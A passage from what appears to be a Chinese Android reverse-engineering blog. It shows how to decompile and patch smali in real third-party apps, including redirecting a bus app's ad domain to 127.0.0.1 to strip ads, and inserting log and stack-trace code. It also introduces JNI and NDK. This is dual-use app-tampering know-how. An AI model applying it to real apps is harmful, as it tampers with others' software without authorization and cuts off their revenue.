class="line-numbers language-none"><code class="language-none">if-nez v0, :cond_0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653647.png" alt="image-20210802145613444"></p><p>进行回编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653648.png" alt="image-20210802145711922"></p><p>进行查看</p><p>当我们点击的时候 成功退出了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653649.png" alt="image-20210802145854092"></p><h2 id="实操五：车来了"><a href="#实操五：车来了" class="headerlink" title="实操五：车来了"></a>实操五：车来了</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653650.png" alt="image-20210802150137291"></p><p>打开</p><p>可以看到 广告</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653651.png" alt="image-20210802151113781"></p><p>那么我们的目标就是：去掉这些中间的广告</p><p>今天这里运用<code>ddms</code></p><h3 id="ddms"><a href="#ddms" class="headerlink" title="ddms"></a>ddms</h3><p>进行启动</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653652.png" alt="image-20210802151423267"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653653.png" alt="image-20210802151715778"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653654.png" alt="image-20210802151511432"></p><p>它可以对栈和堆进行跟踪</p><p>ddms基本界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653655.png" alt="image-20210802153027309"></p><p>它给我们的一个设备 </p><p>这个就是 读取目前存活的设备</p><pre class="line-numbers language-none"><code class="language-none">adb devices<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而</p><pre class="line-numbers language-none"><code class="language-none">dumpsys activity top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>它是抓取当前顶层的页面信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653656.png" alt="image-20210802153142469"></p><p>这都是相对应的</p><p>继续</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653657.png" alt="image-20210802153347455"></p><p>分别对应package、端口、PID</p><p>继续</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653658.png" alt="image-20210802153520380"></p><p>这是一个过滤寄存器</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653659.png" alt="image-20210802153542402"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653660.png" alt="image-20210802155229239"></p><p>一般只用填这两个</p><p>继续</p><p>存活机器 运行应用之后 会有信息</p><p>这里是毫秒输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653661.png" alt="image-20210802154113922"></p><p>然后向右走</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653662.png" alt="image-20210802155343122"></p><p>这是6个级别</p><p>然后我们进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653663.png" alt="image-20210802155558255"></p><p>这里提示成功发送第三方埋点</p><p>还附带了链接</p><p>这就是APK中途的一些信息</p><p><a href="http://atrace.chelaile.net.cn/thirdPartyResponse?&amp;traceid=3820bc36-9623-4776-bbfd-fcb593f59c7d_1627890977521&amp;pid=00&amp;s=android&amp;adid=&amp;jsid=1023075&amp;aid=sdk_baidu&amp;adStyle=2&amp;req_time=315&amp;code=200&amp;is_backup=0&amp;ad_order=0&amp;ad_status=1&amp;v=3.68.0&amp;s=android&amp;imei=010305023634174&amp;cityId=027">http://atrace.chelaile.net.cn/thirdPartyResponse?&amp;traceid=3820bc36-9623-4776-bbfd-fcb593f59c7d_1627890977521&amp;pid=00&amp;s=android&amp;adid=&amp;jsid=1023075&amp;aid=sdk_baidu&amp;adStyle=2&amp;req_time=315&amp;code=200&amp;is_backup=0&amp;ad_order=0&amp;ad_status=1&amp;v=3.68.0&amp;s=android&amp;imei=010305023634174&amp;cityId=027</a></p><p>然后我们右键 选择这个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653664.png" alt="image-20210802155821957"></p><p>找到他的包名</p><pre class="line-numbers language-none"><code class="language-none">com.ygkj.chelaile.standard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653665.png" alt="image-20210802155906053"></p><p>添加过滤寄存器</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653666.png" alt="image-20210802160032864"></p><p>添加之后 就只会有这个包的信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653667.png" alt="image-20210802160128691"></p><p>我们继续右键 进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653668.png" alt="image-20210802160302994"></p><p>发现这些广告 都是基于</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653669.png" alt="image-20210802160337612"></p><p>这个域名</p><pre class="line-numbers language-none"><code class="language-none">atrace.chelaile.net.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么第一个思路 就是 我们把这个域名替换成</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Android-Killer分析-1"><a href="#Android-Killer分析-1" class="headerlink" title="Android Killer分析"></a>Android Killer分析</h3><p>进行搜索</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653670.png" alt="image-20210802161324954"></p><p>进行替换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653671.png" alt="image-20210802161412676"></p><p>进行回编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653672.png" alt="image-20210802161603583"></p><p>进行查看 </p><p>因为一些原因 换了 模拟器 现在是雷电</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653673.png" alt="image-20210802161704212"></p><p>可以看到 中间的广告没有了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653674.png" alt="image-20210802161839194"></p><h2 id="实操六：好搜小说大全"><a href="#实操六：好搜小说大全" class="headerlink" title="实操六：好搜小说大全"></a>实操六：好搜小说大全</h2><h3 id="添加injectcode"><a href="#添加injectcode" class="headerlink" title="添加injectcode"></a>添加injectcode</h3><p>这里要给Android Killer添加injectcode</p><p>原目录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653675.png" alt="image-20210802202811744"></p><p>添加后的目录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653676.png" alt="image-20210802202849297"></p><p>重启AndroidKiller</p><p>把好搜小说的APK丢到AndroidKiller中</p><p>随意找一个smali代码看看效果</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653677.png" alt="image-20210802203225801"></p><p>这里要注意一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653678.png" alt="image-20210802203348297"></p><p><strong>一个app程序的入口点比入口界面执行得更早</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653679.png" alt="image-20210802203530709"></p><p>这点一定要记住 </p><h3 id="Log信息输出插桩"><a href="#Log信息输出插桩" class="headerlink" title="Log信息输出插桩"></a>Log信息输出插桩</h3><p>进入入口点smali代码 进行分析</p><p>我们前面在学习Actvity知道 <code>onCreate()</code>是最开始的建立的地方</p><p>这个可以看在<a href="https://www.freebuf.com/articles/mobile/281426.html">安卓学习思路方法总结（二）</a>中的图解</p><p>我们开始分析<code>onCreate()</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653680.png" alt="image-20210802203809905"></p><p>所以插桩就是在代码开始处进行实现</p><p>在下面空白处 右键插入–&gt;代码–&gt;Log信息输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653681.png" alt="image-20210802203852784"></p><p>这里是要输入的文字unicode码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653682.png" alt="image-20210802204023527"></p><p>进行Unicode 转换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653683.png" alt="image-20210802204101796"></p><pre class="line-numbers language-none"><code class="language-none">嘻嘻\u563b\u563b\u563b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653684.png" alt="image-20210802204141937"></p><p>进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653685.png" alt="image-20210802204547619"></p><p><code>const-string</code>在<a href="https://www.freebuf.com/articles/mobile/282950.html">安卓学习思路方法总结（三）</a>中讲过 </p><p>它是数据定义指令</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653687.png" alt="image-20210802204326473"></p><p>同样<code>invoke-stati</code>也在<a href="https://www.freebuf.com/articles/mobile/282950.html">安卓学习思路方法总结（三）</a>中讲过</p><p>它是方法调用指令，用来调用实例的静态方法</p><p>继续</p><p>还需要在程序的入口点插入Log信息</p><p>查找清单文件：<code>Application.xml</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653688.png" alt="image-20210802205844361"></p><p>进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653689.png" alt="image-20210802205938373"></p><pre class="line-numbers language-none"><code class="language-none">android:name="com.reader.ReaderApplication"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面有路径</p><p>那么在工程管理器中</p><p>继续查找<code>com.reader.ReaderApplication</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653690.png" alt="image-20210802210307802"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653691.png" alt="image-20210802210337092"></p><p>进入之后</p><p>继续锁定<code>onCreate()</code>方法</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653692.png" alt="image-20210802210428627"></p><p>继续在<code>.prologue</code>下进行插桩</p><p>这次我们插入一个</p><pre class="line-numbers language-none"><code class="language-none">哈哈哈\u54c8\u54c8\u54c8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653693.png" alt="image-20210802211327532"></p><p>保存 进行回编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653694.png" alt="image-20210802211503628"></p><p>进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653695.png" alt="image-20210802205417666"></p><h3 id="ddms-1"><a href="#ddms-1" class="headerlink" title="ddms"></a>ddms</h3><p>这个时候我们进行 ddms抓包</p><p>成功连接到设备 并且有信息输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653696.png" alt="image-20210802210944741"></p><p>哈哈哈是入口点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653697.png" alt="image-20210802211814654"></p><p>嘻嘻嘻是入口界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653698.png" alt="image-20210802211836747"></p><p>两者只有几毫秒的差别</p><p><strong>但是入口点永远比入口界面执行的更早</strong></p><h3 id="一些问题解决"><a href="#一些问题解决" class="headerlink" title="一些问题解决"></a>一些问题解决</h3><h4 id="一、程序崩溃"><a href="#一、程序崩溃" class="headerlink" title="一、程序崩溃"></a>一、程序崩溃</h4><p>中间出现的问题</p><p>当我们成功插桩 APK回编译成功</p><p>但是在模拟器中</p><pre class="line-numbers language-none"><code class="language-none">打开失败 程序崩溃 点击没反应<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为插桩导致寄存器不够用，需要加一些寄存器</p><p>进行全局搜索</p><pre class="line-numbers language-none"><code class="language-none">locals 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随意修改</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653699.png" alt="image-20210802212526851"></p><p>修改为  加一些寄存器</p><pre class="line-numbers language-none"><code class="language-none">locals 1或locals 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进行回编译 </p><h4 id="二、init"><a href="#二、init" class="headerlink" title="二、init()"></a>二、init()</h4><p>我们也喜欢在<code>init()</code>这个方法这里进行插桩</p><p>因为init表示这个方法在初始化，在初始化状态下是不会去调用任何寄存器状态，没加载入口点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653700.png" alt="image-20210802213127464"></p><h2 id="栈跟踪：好搜小说大全"><a href="#栈跟踪：好搜小说大全" class="headerlink" title="栈跟踪：好搜小说大全"></a>栈跟踪：好搜小说大全</h2><p>继续就上一个实操的 </p><p>APK：好搜小说大全</p><h3 id="获取当前界面进程"><a href="#获取当前界面进程" class="headerlink" title="获取当前界面进程"></a>获取当前界面进程</h3><pre class="line-numbers language-none"><code class="language-none">adb shell dumpsys activity top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">com.qihoo.haosou.subscribe.vertical.book<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653701.png" alt="image-20210802213440616"></p><h3 id="ddms-2"><a href="#ddms-2" class="headerlink" title="ddms"></a>ddms</h3><p>进入该界面调取程序栈</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653702.png" alt="image-20210802213606310"></p><p>然后进行过滤寄存器的添加</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653703.png" alt="image-20210802213759196"></p><p>进行查看输出的信息</p><p>开始第一个关注点：<code>System.err</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653704.png" alt="image-20210802213942688"></p><p>这里要理解一下中间的关系</p><p>上层是调用者 下层是被调用者</p><p>我们看的时候 应该是<strong>从下往上看</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653705.png" alt="image-20210802214248899"></p><h3 id="StackTrace栈跟踪"><a href="#StackTrace栈跟踪" class="headerlink" title="StackTrace栈跟踪"></a>StackTrace栈跟踪</h3><p>然后<code>StackTrace栈跟踪</code>的插桩</p><p>同样是找到入口点的<code>smali</code>代码 </p><p>然后锁定<code>loadData()</code>方法</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653706.png" alt="image-20210802214535724"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653707.png" alt="image-20210802214626309"></p><p>简单分析一下</p><p>我们加入了两个局部变量寄存器v0和v1</p><p>程序本身locals也存在两个局部变量寄存器，所以就不需要修改了</p><p>然后<code>print trace</code>是打印栈</p><pre class="line-numbers language-none"><code class="language-none">new-instance v0, Ljava/lang/Exception;    const-string v1, "print trace"    invoke-direct {v0, v1}, Ljava/lang/Exception;-&gt;&lt;init&gt;(Ljava/lang/String;)V    invoke-virtual {v0}, Ljava/lang/Exception;-&gt;printStackTrace()V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653708.png" alt="image-20210802214911349"></p><p>然后保存 进行回编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653709.png" alt="image-20210802215142716"></p><p>模拟器重新安装 进行打开</p><h3 id="ddms2"><a href="#ddms2" class="headerlink" title="ddms2"></a>ddms2</h3><p>继续上ddms  进行分析</p><p>依然 进行 过滤寄存器的锁定</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653710.png" alt="image-20210802215938816"></p><p>这里没有这个信息的话</p><p>可以重启 一下ddms</p><p>看到System.err  同时打印了<code>print.trace</code></p><p>是从那里开始的</p><p>同样是从下往上看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653711.png" alt="image-20210802220134887"></p><p>然后我们呢 是从<code>loadData</code>下插入 <code>StackTrace栈跟踪</code>  也续上了 </p><p>请记住：从下网上看！</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653712.png" alt="image-20210802221958144"></p><p>然后进行 登录界面的栈跟踪</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653713.png" alt="image-20210802221910477"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653714.png" alt="image-20210802221937695"></p><p>然后取ddms中进行：暂停分析栈</p><p>当我们随意的选择一个类的时候</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653715.png" alt="image-20210802220640554"></p><p>菜单栏中的 按钮就可以用了</p><p>我圈注的这个是：暂停分析栈</p><p>当我们点击它之后</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653716.png" alt="image-20210802220745795"></p><p>第一个选择是自定过滤</p><p>第二个选择是打印所有的</p><p>选择第一个 1000就可以</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653717.png" alt="image-20210802221736166"></p><p>然后OK 之后</p><p>点击进行启动</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653718.png" alt="image-20210803153954500"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653719.png" alt="image-20210803154016503"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653720.png" alt="image-20210803154151321"></p><p>然后等待 一会 就会弹出一个窗口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653721.png" alt="image-20210803154224104"></p><p>总共有246个方法</p><p>这个取决于点击<code>立即登录</code>的速度</p><p>进行分析一下节点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653722.png" alt="image-20210803154429175"></p><p>Parents：父节点 当前方法的上层调用<br><strong>如果父节点下面没有节点，就是系统自启动的</strong></p><p>Children：子节点 当前方法的下层调用<br>可以理解 Children以下的都是 Parents子节点</p><p>调用的是一个循环体</p><p>这里就是：1分支—&gt;0分支—&gt;26分支—&gt;循环体—&gt;0分支—&gt;1分支</p><p>然后1分支 又会开始另外的循环</p><p>然后参数解读</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653723.png" alt="image-20210803155515151"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653724.png" alt="image-20210803155534353"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653725.png" alt="image-20210803155545288"></p><p>分析：onclick</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653726.png" alt="image-20210803155809469"></p><p>那么就是 85分支—&gt;84分支—&gt;83分支</p><p>这是一个登录逻辑</p><p>OK 这篇就到这里 栈跟踪一定要会</p><p><strong>请注意：这里使用的技术仅用于学习知识目的，如果列出的技术用于其他任何目标，我概不负责。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(四) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(六)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-liu/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-liu/</url>
      
        <content type="html"><![CDATA[<h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>JNI是Java Native Interface的缩写，通过使用 <a href="https://baike.baidu.com/item/Java/85979">Java</a>本地接口书写程序，可以确保代码在不同的平台上方便移植。</p><p>从Java1.1开始，JNI标准成为java平台的一部分，它允许Java代码和其他语言写的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81/86048">代码</a>进行交互。JNI一开始是为了本地已<a href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91/1258343">编译</a>语言，尤其是C和C++而设计的，但是它并不妨碍你使用其他编程语言，只要调用约定受支持就可以了。</p><p>使用java与本地已编译的代码<a href="https://baike.baidu.com/item/%E4%BA%A4%E4%BA%92/6964417">交互</a>，通常会丧失平台<a href="https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/6931884">可移植性</a>。但是，有些情况下这样做是可以接受的，甚至是必须的。</p><p>JNI的接口就是一些函数的API</p><h3 id="JNI接口"><a href="#JNI接口" class="headerlink" title="JNI接口"></a>JNI接口</h3><p>Java语言发展到现在已经经历了20多年，其语言框架本身已经非常成熟，而且整个生态都保持得非常好，因而再与底层的C、甚至汇编进行辅助的话，那就能释放出更强大的威力来。而Java要与本地底层代码进行交互，则需要通过<code>JNI(Java Native Interface)</code>接口</p><h3 id="JNI作用"><a href="#JNI作用" class="headerlink" title="JNI作用"></a>JNI作用</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812132234704.png" alt="image-20210812132234704"></p><p>JN接口是处在Java层和C/C++层之间，承担桥梁作用</p><p>1、通过JN接口实现Java层与 Native层相互调用<br>2、JNI接口中的类型</p><pre class="line-numbers language-none"><code class="language-none">1、调用java层普通方法-CallObjectMethod2、获取Java层实例字段的值-GetMethodID3、获取Java层实例字段的值4、设置Java层实例字段的值5、调用Java层静态方法6、获取Java层静态字段的值7、设置Java层静态宇段的值8、New开头的函数就是创建<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">get 获取set 设置call 调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="CallObjectMethod"><a href="#CallObjectMethod" class="headerlink" title="CallObjectMethod"></a>CallObjectMethod</h3><p>调用一个方法，返回值是 Object</p><p>void是表示返回值为空！所以使用的方法就是构建参数后面三个参数</p><h4 id="JNIEnv"><a href="#JNIEnv" class="headerlink" title="JNIEnv*"></a>JNIEnv*</h4><pre class="line-numbers language-none"><code class="language-none">默认参数动态调试经常用到，本地调用的一个接口，提供了大量的jni接口函数去调用可以理解为JNI默认传入的参数型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="jobject"><a href="#jobject" class="headerlink" title="jobject"></a>jobject</h4><pre class="line-numbers language-none"><code class="language-none">也是默认参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="jmethodID"><a href="#jmethodID" class="headerlink" title="jmethodID"></a>jmethodID</h4><p>CallObjectMethod运行操作时的一个方法ID，用来获取java层方法的ID</p><p>在这之前 要先使用，使用<code>GetMethodID</code>方法获取方法ID，作为返回值</p><h3 id="GetMethodID"><a href="#GetMethodID" class="headerlink" title="GetMethodID"></a>GetMethodID</h3><p>它是获取Java层实例字段的值<code>GetMethodID</code></p><pre class="line-numbers language-none"><code class="language-none">jmethodID (*GetMethodID)(JNIEnv*, jclass, const char*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1、<code>JNIEnv</code>：默认参数！<br>2）<code>jclass</code>：一个 findclass引用<br>这里的返回值和jclass目的是一样的，jclass这个参数是由findclass返回值获取的</p><p>3、<code>const char*</code>：参数列表信息3）const char:Java层方法的名称<br>4、<code>const char*</code>：Java层方法的一个签名，是返回值+参数</p><h3 id="获取Java层实例字段的值"><a href="#获取Java层实例字段的值" class="headerlink" title="获取Java层实例字段的值"></a>获取Java层实例字段的值</h3><pre class="line-numbers language-none"><code class="language-none">jobject (*GetObjectField)(JNIEnv*, jobject, jfieldID);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取jfieldID的获取</p><pre class="line-numbers language-none"><code class="language-none">jfieldID (*GetFieldID)(JNIEnv*, jclass, const char*, const char*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置Java层实例字段的值"><a href="#设置Java层实例字段的值" class="headerlink" title="设置Java层实例字段的值"></a>设置Java层实例字段的值</h3><pre class="line-numbers language-none"><code class="language-none">void (*SetObjectField)(JNIEnv*, jobject, jfieldID, jobject);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jfeldID是 GetFieldID的返回值！<br>jobject是一个java层实例字段设置的值！</p><h1 id="NDK"><a href="#NDK" class="headerlink" title="NDK"></a>NDK</h1><h2 id="Eclipse快速创建项目"><a href="#Eclipse快速创建项目" class="headerlink" title="Eclipse快速创建项目"></a>Eclipse快速创建项目</h2><p>这个 我们之前 有提到过</p><p>这里就快速过</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/202108121801416.png"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180217575.png" alt="image-20210812180217575"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180240336.png" alt="image-20210812180240336"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180323169.png" alt="image-20210812180323169"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180344424.png" alt="image-20210812180344424"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180429143.png" alt="image-20210812180429143"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812180614473.png" alt="image-20210812180614473"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812182808692.png" alt="image-20210812182808692"></p><h2 id="静态注册-一"><a href="#静态注册-一" class="headerlink" title="静态注册(一)"></a>静态注册(一)</h2><p>在Java层使用jni接口获取C层定义的一个字符</p><p>定位<code>MainActivity.java</code> </p><p>上一节<a href="https://www.freebuf.com/articles/mobile/284486.html">安卓学习思路方法总结（四）</a>讲到JNI和c的联动</p><p>创建JNI的文件夹</p><p>然后三个文件：<code>aaa.c</code>、<code>Application.mk</code>、<code>Android.mk</code></p><p>然后在JNI目录下进行：<code>ndk-build</code>编译</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/202108121659162.png" alt="image-20210812135357852"></p><p>继续</p><p>这一块时安卓 后期界面的显示</p><p>先删掉</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812194132765.png" alt="image-20210812194132765"></p><h3 id="定义一个方法"><a href="#定义一个方法" class="headerlink" title="定义一个方法"></a>定义一个方法</h3><pre class="line-numbers language-none"><code class="language-none">public native CharSequence Getstring();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812200105803.png" alt="image-20210812200105803"></p><p>在java层使用JDG反编译的时候是看不到它的逻辑代码，只能看到空荡荡的一个方法名，而且这个方法的具体实现在java层是看不到的</p><p>掌握ndk开发的知识，在so程序找到它对应的一个<code>.so</code>文件，然后去分析它的一个逻辑</p><h3 id="区分动态注册！"><a href="#区分动态注册！" class="headerlink" title="区分动态注册！"></a>区分动态注册！</h3><p>动态注册会使用到<code>JNI_onload</code>类里面有个注册函数；</p><p>这里已经定义了一个被native修饰的方法，那么修饰这个方法就要做一些操作，在java层用 Toast展示出来     </p><pre class="line-numbers language-none"><code class="language-none">Toast.makeTest(context,text,duration);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812200248765.png" alt="image-20210812200248765"></p><pre class="line-numbers language-none"><code class="language-none">context:上下文text:弹出的内容字符duration:显示的一个时长<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后进行修改</p><pre class="line-numbers language-none"><code class="language-none">context-&gt;this上下文text-&gt;方法Getstring()duration-&gt;Toast.LENGTH_SHORT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进行显示</p><pre class="line-numbers language-none"><code class="language-none">.show()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Toast.makeText(this,Getstring(),Toast.LENGTH_SHORT).show();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812195740331.png" alt="image-20210812195740331"></p><h3 id="获取src目录"><a href="#获取src目录" class="headerlink" title="获取src目录"></a>获取src目录</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812200610213.png"></p><pre class="line-numbers language-none"><code class="language-none">D:\data\aaa\src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812200630982.png" alt="image-20210812200630982"></p><h3 id="获取完整路径"><a href="#获取完整路径" class="headerlink" title="获取完整路径"></a>获取完整路径</h3><p>被<code>native</code>修饰的一个方法 <code>Getstring()</code>所在的一个类的完整的路径</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812201323490.png" alt="image-20210812201323490"></p><pre class="line-numbers language-none"><code 